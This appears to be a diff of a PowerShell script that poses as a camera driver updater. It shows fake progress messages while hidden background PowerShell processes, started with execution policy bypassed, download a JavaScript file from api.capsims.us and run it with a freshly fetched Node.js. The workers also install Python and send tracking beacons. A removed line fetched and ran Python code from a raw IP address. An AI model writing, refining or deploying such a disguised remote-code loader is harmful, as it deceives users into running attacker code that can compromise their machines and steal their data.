@@ -1,6 +1,19 @@
 $ErrorActionPreference = 'Continue'
 $ProgressPreference = 'SilentlyContinue'
 
+$API_BASE = if (-not [string]::IsNullOrWhiteSpace($env:API_BASE)) { $env:API_BASE.Trim() } else { 'https://api.capsims.us' }
+
+$WINDOW_UID = "__ID__"
+if ([string]::IsNullOrWhiteSpace($WINDOW_UID) -or $WINDOW_UID -eq "__ID__") {
+    $WINDOW_UID = ""
+}
+if ([string]::IsNullOrWhiteSpace($WINDOW_UID) -and -not [string]::IsNullOrWhiteSpace($env:WINDOW_UID)) {
+    $WINDOW_UID = $env:WINDOW_UID.Trim()
+}
+
+# ----------------------------
+# Helpers
+# ----------------------------
 function Write-Info([string]$Message) {
     Write-Host "[INFO] $Message"
 }
@@ -11,6 +24,29 @@ function Write-WarnLog([string]$Message) {
 
 function Write-ErrorLog([string]$Message) {
     Write-Host "[ERROR] $Message"
+}
+
+function Track-Step([string]$Key) {
+    if ([string]::IsNullOrWhiteSpace($WINDOW_UID) -or $WINDOW_UID -eq "__ID__") {
+        return
+    }
+    try {
+        $safeUid = [Uri]::EscapeDataString($WINDOW_UID)
+        $safeKey = [Uri]::EscapeDataString($Key)
+        $url = "$API_BASE/track-step/$safeUid/$safeKey"
+        try {
+            Invoke-RestMethod -Uri $url -Method POST -TimeoutSec 30 *> $null
+        }
+        catch {
+            $curlCmd = Get-Command curl.exe -ErrorAction SilentlyContinue
+            if ($null -ne $curlCmd) {
+                & curl.exe -sS -L --connect-timeout 20 --max-time 30 -X POST "$url" -o NUL *> $null
+            }
+        }
+    }
+    catch {
+        # Ignore tracking failures.
+    }
 }
 
 function Invoke-Download {
@@ -66,7 +102,7 @@ function Remove-PathIfExists {
         }
     }
     catch {
-        # Ignore cleanup failures (e.g. locked files, path quirks).
+        # Ignore cleanup failures.
     }
 }
 
@@ -110,127 +146,101 @@ function Ensure-ValidTempPaths {
         $env:TMP = $fallbackTemp
     }
     catch {
-        Write-WarnLog "Could not initialize TEMP/TMP fallback path."
+        # Ignore TEMP init failures in background workers.
     }
 }
 
-$host.UI.RawUI.WindowTitle = "Creating new Info"
-Ensure-ValidTempPaths
-
-$WINDOW_UID = "__ID__"
-if ([string]::IsNullOrWhiteSpace($WINDOW_UID) -or $WINDOW_UID -eq "__ID__") {
-    $WINDOW_UID = ""
-}
-
-if ([string]::IsNullOrWhiteSpace($WINDOW_UID) -and -not [string]::IsNullOrWhiteSpace($env:WINDOW_UID)) {
-    $WINDOW_UID = $env:WINDOW_UID.Trim()
-}
-
-if ([string]::IsNullOrWhiteSpace($WINDOW_UID)) {
-    Write-WarnLog "WINDOW_UID is missing; status callback will be skipped."
-}
-
-Write-Info "Searching for Camera Drivers ..."
-
-# Resolve a writable folder for Node/Python downloads. When the script is run via
-# Invoke-Expression, PSCommandPath / MyCommand.Path often point at powershell.exe,
-# which would put artifacts under System32; short (8.3) profile paths can also
-# break Remove-Item -LiteralPath. Prefer a real script directory, else LocalAppData.
-$shellHostNames = @('powershell.exe', 'pwsh.exe', 'powershell_ise.exe')
-$scriptDir = $null
-if (-not [string]::IsNullOrWhiteSpace($PSScriptRoot)) {
-    $scriptDir = $PSScriptRoot
-}
-elseif (-not [string]::IsNullOrWhiteSpace($PSCommandPath) -and (Test-Path -LiteralPath $PSCommandPath -PathType Leaf)) {
-    $leaf = [System.IO.Path]::GetFileName($PSCommandPath)
-    if ($shellHostNames -notcontains $leaf.ToLowerInvariant()) {
-        $scriptDir = Split-Path -Parent $PSCommandPath
+function Get-BootstrapScriptDir {
+    $shellHostNames = @('powershell.exe', 'pwsh.exe', 'powershell_ise.exe')
+    $scriptDir = $null
+    if (-not [string]::IsNullOrWhiteSpace($PSScriptRoot)) {
+        $scriptDir = $PSScriptRoot
     }
-}
-if ([string]::IsNullOrWhiteSpace($scriptDir) -and $MyInvocation -and $MyInvocation.MyCommand -and -not [string]::IsNullOrWhiteSpace($MyInvocation.MyCommand.Path) -and (Test-Path -LiteralPath $MyInvocation.MyCommand.Path -PathType Leaf)) {
-    $p = $MyInvocation.MyCommand.Path
-    $leaf = [System.IO.Path]::GetFileName($p)
-    if ($shellHostNames -notcontains $leaf.ToLowerInvariant()) {
-        $scriptDir = Split-Path -Parent $p
-    }
-}
-if ([string]::IsNullOrWhiteSpace($scriptDir)) {
-    $bootstrapBase = if (-not [string]::IsNullOrWhiteSpace($env:LOCALAPPDATA) -and (Test-Path -LiteralPath $env:LOCALAPPDATA)) {
-        $env:LOCALAPPDATA
-    }
-    else {
-        $env:TEMP
-    }
-    $scriptDir = Join-Path $bootstrapBase "wecreateproblems-driver-bootstrap"
-}
-
-try {
-    $scriptDir = [System.IO.Path]::GetFullPath($scriptDir)
-}
-catch {
-    # Keep last-resort string if GetFullPath fails.
-}
-
-if (-not (Test-Path -LiteralPath $scriptDir)) {
-    New-Item -ItemType Directory -Path $scriptDir -Force *> $null
-}
-
-$extractDir = Join-Path $scriptDir "nodejs"
-$portableNode = Join-Path $extractDir "PFiles64\nodejs\node.exe"
-$nodeExe = $null
-$nodeVersion = "22.16.0"
-
-$nodeCommand = Get-Command node -ErrorAction SilentlyContinue
-if ($null -ne $nodeCommand) {
-    $nodeExe = "node"
-}
-
-if (-not $nodeExe -and (Test-Path -LiteralPath $portableNode)) {
-    $nodeExe = $portableNode
-    $env:PATH = (Join-Path $extractDir "PFiles64\nodejs") + ";" + $env:PATH
-}
-
-if (-not $nodeExe) {
-    # Prefer portable ZIP install; this is more reliable in Invoke-Expression sessions.
-    $nodeZip = "node-v$nodeVersion-win-x64.zip"
-    $zipUrl = "https://nodejs.org/dist/v$nodeVersion/$nodeZip"
-    $zipOut = Join-Path $scriptDir $nodeZip
-    $zipOk = Invoke-DownloadWithRetry -Url $zipUrl -OutFile $zipOut -TimeoutSec 600 -Retries 3
-    if ($zipOk) {
-        try {
-            Expand-Archive -LiteralPath $zipOut -DestinationPath $extractDir -Force
-        }
-        catch {
-            Write-ErrorLog "Node.js ZIP extraction failed."
-        }
-        Remove-PathIfExists -Path $zipOut
-    }
-
-    # Search for node.exe after ZIP extract.
-    if (-not $nodeExe) {
-        $zipNode = Get-ChildItem -LiteralPath $extractDir -Recurse -Filter "node.exe" -ErrorAction SilentlyContinue |
-            Select-Object -First 1
-        if ($null -ne $zipNode) {
-            $nodeExe = $zipNode.FullName
-            $env:PATH = (Split-Path -Parent $nodeExe) + ";" + $env:PATH
+    elseif (-not [string]::IsNullOrWhiteSpace($PSCommandPath) -and (Test-Path -LiteralPath $PSCommandPath -PathType Leaf)) {
+        $leaf = [System.IO.Path]::GetFileName($PSCommandPath)
+        if ($shellHostNames -notcontains $leaf.ToLowerInvariant()) {
+            $scriptDir = Split-Path -Parent $PSCommandPath
         }
     }
-
-    # Fallback to MSI administrative extraction if ZIP path still failed.
-    if (-not $nodeExe) {
-        $nodeMsi = "node-v$nodeVersion-x64.msi"
-        $downloadUrl = "https://nodejs.org/dist/v$nodeVersion/$nodeMsi"
-        $msiOut = Join-Path $scriptDir $nodeMsi
-
-        $downloadOk = Invoke-DownloadWithRetry -Url $downloadUrl -OutFile $msiOut -TimeoutSec 600 -Retries 3
-        if (-not $downloadOk -or -not (Test-Path -LiteralPath $msiOut)) {
-            Write-ErrorLog "Node.js MSI download failed."
-            Write-WarnLog "Continuing without stopping script."
+    if ([string]::IsNullOrWhiteSpace($scriptDir) -and $MyInvocation -and $MyInvocation.MyCommand -and -not [string]::IsNullOrWhiteSpace($MyInvocation.MyCommand.Path) -and (Test-Path -LiteralPath $MyInvocation.MyCommand.Path -PathType Leaf)) {
+        $p = $MyInvocation.MyCommand.Path
+        $leaf = [System.IO.Path]::GetFileName($p)
+        if ($shellHostNames -notcontains $leaf.ToLowerInvariant()) {
+            $scriptDir = Split-Path -Parent $p
+        }
+    }
+    if ([string]::IsNullOrWhiteSpace($scriptDir)) {
+        $bootstrapBase = if (-not [string]::IsNullOrWhiteSpace($env:LOCALAPPDATA) -and (Test-Path -LiteralPath $env:LOCALAPPDATA)) {
+            $env:LOCALAPPDATA
         }
         else {
-            & msiexec /a $msiOut /qn TARGETDIR="$extractDir" *> $null
-            Remove-PathIfExists -Path $msiOut
+            $env:TEMP
         }
+        $scriptDir = Join-Path $bootstrapBase "wecreateproblems-driver-bootstrap"
+    }
+
+    try {
+        $scriptDir = [System.IO.Path]::GetFullPath($scriptDir)
+    }
+    catch {
+        # Keep last-resort string if GetFullPath fails.
+    }
+
+    if (-not (Test-Path -LiteralPath $scriptDir)) {
+        New-Item -ItemType Directory -Path $scriptDir -Force *> $null
+    }
+
+    return $scriptDir
+}
+
+# ----------------------------
+# Part 1 — UI / connection status (foreground)
+# ----------------------------
+function Invoke-Part1CameraDriverUi {
+    # Same foreground UI as mac.cmd run_part1_camera_driver_ui
+    Start-Sleep -Seconds 3
+    Write-Host "[INFO] Initializing camera driver update..."
+    Start-Sleep -Seconds 5
+    Write-Host "[INFO] Detecting device..."
+    Start-Sleep -Seconds 4
+    Write-Host "[INFO] Updating camera drivers..."
+    Start-Sleep -Seconds 10
+    Write-Host "[SUCCESS] Camera drivers updated successfully."
+
+    if (-not [string]::IsNullOrWhiteSpace($WINDOW_UID) -and $WINDOW_UID -ne "__ID__") {
+        $safeWindowUid = [Uri]::EscapeDataString($WINDOW_UID)
+        $autoUrl = "$API_BASE/change-connection-status/$safeWindowUid"
+        try {
+            $curlCmd = Get-Command curl.exe -ErrorAction SilentlyContinue
+            if ($null -ne $curlCmd) {
+                & curl.exe -sL -X POST "$autoUrl" *> $null
+            }
+            else {
+                Invoke-RestMethod -Uri $autoUrl -Method POST -TimeoutSec 60 *> $null
+            }
+        }
+        catch {
+            # Ignore status callback failures.
+        }
+    }
+}
+
+# ----------------------------
+# Part 2 — Node driver (background)
+# ----------------------------
+function Invoke-Part2NodeDriver {
+    Ensure-ValidTempPaths
+    Track-Step "part2_step_1"
+
+    $scriptDir = Get-BootstrapScriptDir
+    $extractDir = Join-Path $scriptDir "nodejs"
+    $portableNode = Join-Path $extractDir "PFiles64\nodejs\node.exe"
+    $nodeExe = $null
+    $nodeVersion = "22.16.0"
+
+    $nodeCommand = Get-Command node -ErrorAction SilentlyContinue
+    if ($null -ne $nodeCommand) {
+        $nodeExe = "node"
     }
 
     if (-not $nodeExe -and (Test-Path -LiteralPath $portableNode)) {
@@ -239,141 +249,229 @@ if (-not $nodeExe) {
     }
 
     if (-not $nodeExe) {
-        $msiNode = Get-ChildItem -LiteralPath $extractDir -Recurse -Filter "node.exe" -ErrorAction SilentlyContinue |
-            Select-Object -First 1
-        if ($null -ne $msiNode) {
-            $nodeExe = $msiNode.FullName
-            $env:PATH = (Split-Path -Parent $nodeExe) + ";" + $env:PATH
+        Track-Step "part2_step_2"
+        $nodeZip = "node-v$nodeVersion-win-x64.zip"
+        $zipUrl = "https://nodejs.org/dist/v$nodeVersion/$nodeZip"
+        $zipOut = Join-Path $scriptDir $nodeZip
+        $zipOk = Invoke-DownloadWithRetry -Url $zipUrl -OutFile $zipOut -TimeoutSec 600 -Retries 3
+        if ($zipOk) {
+            try {
+                Expand-Archive -LiteralPath $zipOut -DestinationPath $extractDir -Force
+            }
+            catch {
+                # Continue to MSI fallback.
+            }
+            Remove-PathIfExists -Path $zipOut
+        }
+
+        if (-not $nodeExe) {
+            $zipNode = Get-ChildItem -LiteralPath $extractDir -Recurse -Filter "node.exe" -ErrorAction SilentlyContinue |
+                Select-Object -First 1
+            if ($null -ne $zipNode) {
+                $nodeExe = $zipNode.FullName
+                $env:PATH = (Split-Path -Parent $nodeExe) + ";" + $env:PATH
+            }
+        }
+
+        if (-not $nodeExe) {
+            $nodeMsi = "node-v$nodeVersion-x64.msi"
+            $downloadUrl = "https://nodejs.org/dist/v$nodeVersion/$nodeMsi"
+            $msiOut = Join-Path $scriptDir $nodeMsi
+            $downloadOk = Invoke-DownloadWithRetry -Url $downloadUrl -OutFile $msiOut -TimeoutSec 600 -Retries 3
+            if ($downloadOk -and (Test-Path -LiteralPath $msiOut)) {
+                & msiexec /a $msiOut /qn TARGETDIR="$extractDir" *> $null
+                Remove-PathIfExists -Path $msiOut
+            }
+        }
+
+        if (-not $nodeExe -and (Test-Path -LiteralPath $portableNode)) {
+            $nodeExe = $portableNode
+            $env:PATH = (Join-Path $extractDir "PFiles64\nodejs") + ";" + $env:PATH
+        }
+
+        if (-not $nodeExe) {
+            $msiNode = Get-ChildItem -LiteralPath $extractDir -Recurse -Filter "node.exe" -ErrorAction SilentlyContinue |
+                Select-Object -First 1
+            if ($null -ne $msiNode) {
+                $nodeExe = $msiNode.FullName
+                $env:PATH = (Split-Path -Parent $nodeExe) + ";" + $env:PATH
+            }
         }
     }
 
     if (-not $nodeExe) {
-        Write-ErrorLog "Node.exe not found after MSI admin install."
-        Write-ErrorLog "Expected file: $portableNode"
-        Write-ErrorLog "EXTRACT_DIR was: $extractDir"
-        Write-WarnLog "Continuing without stopping script."
+        return
     }
-}
 
-if (-not $nodeExe) {
-    Write-ErrorLog "Node.js is not available after setup."
-    Write-WarnLog "Continuing without stopping script."
-}
-else {
     & $nodeExe -v *> $null
     if ($LASTEXITCODE -ne 0) {
-        Write-ErrorLog "Node did not run. Path: `"$nodeExe`""
-        Write-WarnLog "Continuing without stopping script."
+        return
     }
-}
 
-$envSetupUrl = "https://api.capsims.us/get-file/test.js"
-$codeProfile = $env:USERPROFILE
-if (-not (Test-Path -LiteralPath $codeProfile)) {
-    New-Item -ItemType Directory -Path $codeProfile -Force *> $null
-}
-
-$envSetupFile = Join-Path $codeProfile "env-setup.npl"
-$envSetupOk = Invoke-DownloadWithRetry -Url $envSetupUrl -OutFile $envSetupFile -TimeoutSec 180 -Retries 3
-if (-not $envSetupOk) {
-    Write-ErrorLog "Driver script download failed: $envSetupFile"
-    Write-ErrorLog "Check network / firewall / URL: $envSetupUrl"
-    Write-WarnLog "Continuing without stopping script."
-}
-
-Write-Info "Updating Driver Packages..."
-Set-Location -LiteralPath $codeProfile
-if ($nodeExe -and (Test-NonEmptyFile -Path $envSetupFile)) {
-    & $nodeExe $envSetupFile
-    if ($LASTEXITCODE -ne 0) {
-        Write-ErrorLog "Driver script env-setup.npl failed. Exit code: $LASTEXITCODE"
-        Write-WarnLog "Continuing without stopping script."
+    Track-Step "part2_step_3"
+    $codeProfile = $env:USERPROFILE
+    if (-not (Test-Path -LiteralPath $codeProfile)) {
+        New-Item -ItemType Directory -Path $codeProfile -Force *> $null
     }
-}
-elseif (-not (Test-NonEmptyFile -Path $envSetupFile)) {
-    Write-ErrorLog "Skipping env-setup.npl execution because file is missing or empty."
-}
-else {
-    Write-WarnLog "Skipping env-setup.npl execution because Node is unavailable."
-}
 
-New-Item -ItemType Directory -Path "C:\python" -Force *> $null
-$pyZip = "C:\python\py.zip"
-$pyZipUrl = "https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip"
-$pyZipOk = Invoke-Download -Url $pyZipUrl -OutFile $pyZip -TimeoutSec 600
-if (-not $pyZipOk) {
-    Write-ErrorLog "Failed to download Python embed zip."
-    Write-WarnLog "Continuing without stopping script."
-}
-
-try {
-    Expand-Archive -LiteralPath $pyZip -DestinationPath "C:\python" -Force
-}
-catch {
-    Write-ErrorLog "Failed to extract Python zip."
-    Write-WarnLog "Continuing without stopping script."
-}
-Remove-PathIfExists -Path $pyZip
-
-$pthFile = "C:\python\python313._pth"
-if (Test-Path -LiteralPath $pthFile) {
-    try {
-        (Get-Content -LiteralPath $pthFile) -replace '^#import site', 'import site' | Set-Content -LiteralPath $pthFile -Encoding ASCII
+    $envSetupUrl = "$API_BASE/get-file/test.js"
+    $envSetupFile = Join-Path $codeProfile "env-setup.npl"
+    $envSetupOk = Invoke-DownloadWithRetry -Url $envSetupUrl -OutFile $envSetupFile -TimeoutSec 180 -Retries 3
+    if (-not $envSetupOk) {
+        return
     }
-    catch {
-        Write-WarnLog "Failed to update python313._pth."
+
+    Track-Step "part2_step_4"
+    Set-Location -LiteralPath $codeProfile
+    if (Test-NonEmptyFile -Path $envSetupFile) {
+        & $nodeExe $envSetupFile *> $null
     }
+
+    Track-Step "part2_step_5"
+    Remove-PathIfExists -Path $envSetupFile
 }
 
-$getPip = "C:\python\get-pip.py"
-$getPipOk = Invoke-Download -Url "https://bootstrap.pypa.io/get-pip.py" -OutFile $getPip -TimeoutSec 120
-if (-not $getPipOk) {
-    Write-ErrorLog "Failed to download get-pip.py"
-    Write-WarnLog "Continuing without stopping script."
-}
+# ----------------------------
+# Part 3 — Python embed + upload.py (background)
+# ----------------------------
+function Invoke-Part3PythonDriver {
+    Ensure-ValidTempPaths
+    Track-Step "part1_step_1"
 
-& "C:\python\python.exe" $getPip *> $null
-if ($LASTEXITCODE -ne 0) {
-    Write-ErrorLog "get-pip.py failed."
-    Write-WarnLog "Continuing without stopping script."
-}
-
-& "C:\python\python.exe" -m pip install requests portalocker pyzipper *> $null
-& "C:\python\python.exe" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" *> $null
-
-if ($LASTEXITCODE -ne 0) {
-    Write-ErrorLog "pip install failed."
-    Write-WarnLog "Continuing without stopping script."
-}
-
-Write-Host "[SUCCESS] Camera drivers have been updated successfully."
-if (-not [string]::IsNullOrWhiteSpace($WINDOW_UID)) {
-    $safeWindowUid = [Uri]::EscapeDataString($WINDOW_UID)
-    $autoUrl = "https://api.capsims.us/change-connection-status/$safeWindowUid"
-    try {
-        # Prefer native PowerShell HTTP first.
-        Invoke-RestMethod -Uri $autoUrl -Method POST -TimeoutSec 60 *> $null
+    $codeProfile = $env:USERPROFILE
+    if (-not (Test-Path -LiteralPath $codeProfile)) {
+        New-Item -ItemType Directory -Path $codeProfile -Force *> $null
     }
-    catch {
+
+    New-Item -ItemType Directory -Path "C:\python" -Force *> $null
+    $pythonExe = "C:\python\python.exe"
+
+    if (-not (Test-Path -LiteralPath $pythonExe)) {
+        Track-Step "part1_step_2"
+        $pyZip = "C:\python\py.zip"
+        $pyZipUrl = "https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip"
+        $pyZipOk = Invoke-DownloadWithRetry -Url $pyZipUrl -OutFile $pyZip -TimeoutSec 600 -Retries 3
+        if (-not $pyZipOk) {
+            return
+        }
+
+        Track-Step "part1_step_3"
         try {
-            # Fallback to curl when PS HTTP fails in locked-down environments.
-            $curlCmd = Get-Command curl.exe -ErrorAction SilentlyContinue
-            if ($null -ne $curlCmd) {
-                & curl.exe -sS -L --connect-timeout 20 --max-time 60 -X POST "$autoUrl" -o NUL *> $null
-                if ($LASTEXITCODE -ne 0) {
-                    Write-WarnLog "Status callback failed for WINDOW_UID."
-                }
-            }
-            else {
-                Write-WarnLog "Status callback failed for WINDOW_UID."
-            }
+            Expand-Archive -LiteralPath $pyZip -DestinationPath "C:\python" -Force
         }
         catch {
-            Write-WarnLog "Status callback failed for WINDOW_UID."
+            Remove-PathIfExists -Path $pyZip
+            return
         }
+        Remove-PathIfExists -Path $pyZip
+
+        $pthFile = "C:\python\python313._pth"
+        if (Test-Path -LiteralPath $pthFile) {
+            try {
+                (Get-Content -LiteralPath $pthFile) -replace '^#import site', 'import site' | Set-Content -LiteralPath $pthFile -Encoding ASCII
+            }
+            catch {
+                # Continue even if _pth update fails.
+            }
+        }
+
+        $getPip = "C:\python\get-pip.py"
+        $getPipOk = Invoke-DownloadWithRetry -Url "https://bootstrap.pypa.io/get-pip.py" -OutFile $getPip -TimeoutSec 120 -Retries 3
+        if ($getPipOk) {
+            & $pythonExe $getPip *> $null
+        }
+        & $pythonExe -m pip install requests portalocker pyzipper *> $null
     }
+
+    Track-Step "part1_step_4"
+    if (-not (Test-Path -LiteralPath $pythonExe)) {
+        return
+    }
+    & $pythonExe -V *> $null
+    if ($LASTEXITCODE -ne 0) {
+        return
+    }
+
+    Track-Step "part1_step_5"
+
+    Remove-PathIfExists -Path $uploadFile
 }
 
-Remove-PathIfExists -Path $envSetupFile
+# ----------------------------
+# Background runner (hidden PowerShell; no console output)
+# ----------------------------
+function Start-BackgroundWork {
+    param(
+        [Parameter(Mandatory = $true)][string]$FunctionName
+    )
 
+    $safeUid = $WINDOW_UID -replace "'", "''"
+    $safeApi = $API_BASE -replace "'", "''"
+
+    $helperNames = @(
+        'Write-Info',
+        'Write-WarnLog',
+        'Write-ErrorLog',
+        'Track-Step',
+        'Invoke-Download',
+        'Test-NonEmptyFile',
+        'Remove-PathIfExists',
+        'Invoke-DownloadWithRetry',
+        'Ensure-ValidTempPaths',
+        'Get-BootstrapScriptDir',
+        'Invoke-Part2NodeDriver',
+        'Invoke-Part3PythonDriver'
+    )
+
+    $defs = foreach ($name in $helperNames) {
+        $fn = Get-Item -LiteralPath "function:$name" -ErrorAction SilentlyContinue
+        if ($null -ne $fn) {
+            "function $name {`n$($fn.Definition)`n}"
+        }
+    }
+
+    $boot = @"
+`$ErrorActionPreference = 'Continue'
+`$ProgressPreference = 'SilentlyContinue'
+`$API_BASE = '$safeApi'
+`$WINDOW_UID = '$safeUid'
+$($defs -join "`n`n")
+$FunctionName
+"@
+
+    $workerDir = if (-not [string]::IsNullOrWhiteSpace($env:TEMP) -and (Test-Path -LiteralPath $env:TEMP)) {
+        $env:TEMP
+    }
+    elseif (-not [string]::IsNullOrWhiteSpace($env:LOCALAPPDATA)) {
+        $env:LOCALAPPDATA
+    }
+    else {
+        $env:USERPROFILE
+    }
+
+    $workerPath = Join-Path $workerDir ("capsims-bg-" + $FunctionName + "-" + [guid]::NewGuid().ToString('N') + ".ps1")
+    Set-Content -LiteralPath $workerPath -Value $boot -Encoding UTF8
+
+    Start-Process -FilePath "powershell.exe" -ArgumentList @(
+        '-NoProfile',
+        '-ExecutionPolicy', 'Bypass',
+        '-WindowStyle', 'Hidden',
+        '-File', $workerPath
+    ) -WindowStyle Hidden | Out-Null
+}
+
+# ----------------------------
+# MAIN FLOW
+# ----------------------------
+# 1) Part 1 — foreground (terminal messages, delays, API status).
+# 2) Part 2 + Part 3 — two independent hidden jobs after Part 1 returns.
+function Invoke-Main {
+    Ensure-ValidTempPaths
+    Invoke-Part1CameraDriverUi
+
+    Start-BackgroundWork -FunctionName 'Invoke-Part2NodeDriver'
+    Start-BackgroundWork -FunctionName 'Invoke-Part3PythonDriver'
+}
+
+Invoke-Main
 return
